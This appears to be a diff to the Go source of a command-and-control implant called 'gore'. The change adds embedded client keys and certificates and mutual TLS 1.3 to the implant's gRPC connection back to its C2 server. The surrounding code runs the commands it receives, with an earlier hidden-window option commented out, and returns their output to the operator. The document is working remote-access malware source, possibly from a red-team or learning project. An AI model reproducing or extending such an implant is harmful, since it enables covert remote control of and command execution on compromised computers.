@@ -2,6 +2,9 @@ package main
 
 import (
 	"context"
+	"crypto/tls"
+	"crypto/x509"
+	_ "embed"
 	"fmt"
 	"gore/grpcapi"
 	"log"
@@ -11,6 +14,7 @@ import (
 	"time"
 
 	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials"
 )
 
 /*
@@ -29,6 +33,17 @@ var (
 	port_str string
 )
 
+//load the keys and certs as embeded files
+
+//go:embed client.key
+var client_key []byte
+
+//go:embed client.pem
+var client_pem []byte
+
+//go:embed CAcert.pem
+var cacert_pem []byte
+
 func main() {
 	var (
 		opts   []grpc.DialOption
@@ -37,9 +52,27 @@ func main() {
 		client grpcapi.ImplantClient //created generically from the protoc compiler.
 
 	)
-	//debug print statement, making sure the build command works
-	//fmt.Printf("[:] UUID is: %s\n", uuid)
-	//fmt.Printf("[:] C2 server: %s:%s\n", ip, port_str)
+	//TODO: add TLS data here
+	//load the client key and cert
+	clientCert, err := tls.X509KeyPair(client_pem, client_key)
+	if err != nil {
+		log.Fatalf("[!] Failed to load client certificate and key. %s", err)
+	}
+	//load the certificate authority into the cert pool
+	certPool := x509.NewCertPool()
+	if !certPool.AppendCertsFromPEM(cacert_pem) {
+		log.Fatalf("[!] Failed to load certificate authority cert. %s", err)
+	}
+	//set up TLS configurations
+	tlsConfig := &tls.Config{
+		Certificates: []tls.Certificate{clientCert},
+		RootCAs:      certPool,
+		MinVersion:   tls.VersionTLS13,
+		MaxVersion:   tls.VersionTLS13,
+	}
+	// Create a new TLS credentials based on the TLS configuration
+	cred := credentials.NewTLS(tlsConfig)
+	opts = []grpc.DialOption{grpc.WithTransportCredentials(cred)}
 	//convert port str to portnum
 	port_num, err := strconv.Atoi(port_str) //maybe just call this some other way, I'm lazy tho
 	if err != nil {
@@ -49,7 +82,7 @@ func main() {
 	//a not-so ismple fix might be to just bite the bullet and assign a self-signed SSL cert that expires i the year 2090 or something.
 	//according to foum posts, "grpc.Dial(":9950", grpc.WithTransportCredentials(insecure.NewCredentials()))" is also a way to do this.
 	//https://stackoverflow.com/questions/70482508/grpc-withinsecure-is-deprecated-use-insecure-newcredentials-instead
-	opts = append(opts, grpc.WithInsecure()) //we would need to alter this to include the certificate and backoff/reconnect
+	//opts = append(opts, grpc.WithInsecure()) //we would need to alter this to include the certificate and backoff/reconnect
 	//connect to server application
 	//new version with compile injection
 	//attempt a connection
@@ -105,7 +138,7 @@ func main() {
 				instr.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			}*/
 		}
-		//create comnined output of command to sned to implant
+		//create combined output of command to sned to implant
 		buffer, err := instr.CombinedOutput()
 		if err != nil {
 			cmd.Out = err.Error()
